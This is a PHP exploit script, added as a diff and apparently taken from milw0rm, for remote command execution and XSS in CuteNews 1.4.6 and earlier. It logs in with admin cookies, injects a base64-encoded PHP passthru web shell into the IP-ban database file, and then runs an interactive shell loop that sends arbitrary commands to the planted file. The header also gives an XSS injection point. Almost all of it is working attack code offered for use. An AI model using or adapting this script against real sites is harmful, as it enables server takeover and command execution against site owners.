@@ -1,0 +1,147 @@
+#!/usr/bin/php -q
+<?php
+
+/*********************************************************************
+ * CuteNews <= 1.4.6 (ip ban) XSS / Remote Command Execution Exploit *
+ * by athos - staker[at]hotmail[dot]it                               *
+ * http://cutephp.com                                                *
+ *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
+ * Remote Command Execution                                          *
+ *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
+ * you need a super account (administrator)                          *
+ * so you can write in ipban.db.php anything ;)                      *
+ *                                                                   *
+ * works regardless of php.ini settings! enjoy your ais              *
+ * note: this vuln is a privilege escalation                         *  
+ *                                                                   *
+ *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*
+ * Cross Site Scripting                                              *
+ *-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--*           
+ * http://[host]/[path]//index.php?mod=[Javascript Code]             *
+ *********************************************************************/
+
+error_reporting(0);
+
+list($cli,$host,$path,$username,$password) = $argv;
+
+if ($argc != 5) {  
+    
+    print "\n+-------------------------------------------------------------+\n";
+    print "\r| CuteNews <= 1.4.6 (ip ban) Remote Command Execution Exploit |\n";
+    print "\r+-------------------------------------------------------------+\n";
+    print "\rby athos - staker[at]hotmail[dot]it / http://cutephp.com\n\n";
+    print "\rUsage: php xpl.php [host] [path] [username] [password]\n\n";
+    print "\rhost     + localhost\n";
+    print "\rpath     + /cutenews\n";
+    print "\rusername + admin username\n";
+    print "\rpassword + admin password\n\n";
+    exit;      
+}         
+
+exploit();
+
+function login () {
+    
+    global $username,$password;
+    
+    $cookies .= "username={$username}; md5_password=";
+    $cookies .= md5($password);
+     
+    return $cookies;
+}    
+
+
+function check_login() {
+    
+    global $host,$path;
+    
+    $auth .= login();
+    
+    $data .= "GET /{$path}/index.php HTTP/1.1\r\n";
+    $data .= "Host: {$host}\r\n";
+    $data .= "User-Agent: Lynx (textmode)\r\n";
+    $data .= "Cookie: $auth;\n";
+    $data .= "Connection: close\r\n\r\n";
+    
+    if (preg_match('/Welcome/i',$data)) {
+        return true;
+    }
+    else {
+        die("Login Failed\n");
+    }    
+}
+
+
+function exploit() {
+
+    global $host,$path;
+    
+    $login  = login();
+    $shell = "PD9waHAgDQpwYXNzdGhydSgkX0dFVFsnYyddKTsgDQo/Pg==";
+    
+    $shell = base64_decode($shell);
+    $post  = "add_ip={$shell}&action=add&mod=ipban";
+    
+    $data .= "POST /{$path}/index.php HTTP/1.1\r\n";
+    $data .= "Host: {$host}\r\n";
+    $data .= "User-Agent: Lynx (textmode)\r\n";
+    $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
+    $data .= "Cookie: $login\r\n";
+    $data .= "Referer: http://{$host}/{$path}/index.php\r\n";
+    $data .= "Content-Type: application/x-www-form-urlencoded\r\n";
+    $data .= "Content-Length: ".strlen($post)."\r\n\r\n";
+    $data .= "{$post}\r\n\r\n";
+           
+    if (eregi('passthru',data_send($host,$data))) {
+        yeat_shell();
+    }
+    else {
+        die("Exploit Failed!\n");
+    }                 
+}
+
+
+function yeat_shell() {
+    
+    while (1) {
+        echo "yeat[shell]~$: "; 
+        $exec = stripslashes(trim(fgets(STDIN)));  
+        
+        if (preg_match('/^(exit|--exit|quit|--quit)$/i',$exec)) die("\nExited\n");
+        if (preg_match('/^(help|--help)$/i',$exec)) echo("\nExample: uname -a\n");
+        if (preg_match('/^(about|--about)$/i',$exec)) echo("\nstaker[at]hotmail[dot]it\n");
+        
+        print data_exec($exec);     
+    }
+}
+
+
+function data_exec($exec) {
+    
+    global $host,$path;
+    
+    $exec = urlencode($exec);
+    $data .= "GET /{$path}/data/ipban.db.php?c={$exec} HTTP/1.1\r\n";
+    $data .= "Host: {$host}\r\n";
+    $data .= "User-Agent: Lynx (textmode)\r\n";
+    $data .= "Connection: close\r\n\r\n";
+    
+    $html = data_send ($host,$data);
+    $html = str_replace('|0||',null,$html);
+    return $html;
+}
+
+
+function data_send ($host,$data) {
+   
+    if (!$sock = @fsockopen($host,80)) {
+        die("Connection refused,try again!\n");
+    }   fputs($sock,$data);
+    
+    while (!feof($sock)) { $html .= fgets($sock); }
+    
+    fclose($sock);
+    return $html;
+}   
+
+# milw0rm.com [2009-01-08]
